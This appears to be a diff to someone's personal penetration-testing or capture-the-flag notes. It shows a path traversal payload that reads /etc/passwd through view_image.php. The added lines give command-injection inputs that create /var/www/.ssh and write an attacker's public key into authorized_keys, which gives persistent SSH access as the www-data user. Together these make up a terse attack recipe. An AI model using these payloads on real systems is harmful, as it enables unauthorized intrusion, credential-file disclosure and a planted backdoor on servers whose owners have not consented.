@@ -71,6 +71,16 @@ view_image.php?file=../../etc/passwd
 
 once on system cd /var/www/html/ for website backend
 ----------------------------------------------------------------
+based around user WWW-data
+
+
+
+
+
+in file  SSGT WILSON INSTRUCTIONS use in tandom between my cmd inject instructions
+; mkdir/var/www/.ssh
+; echo "entire pubkey"  > /var/www/.ssh/authorized_keys
+; cat /var/www/.ssh/authorized_keys
 
 Command Injection
 ssh-keygen -t rsa -b 4096
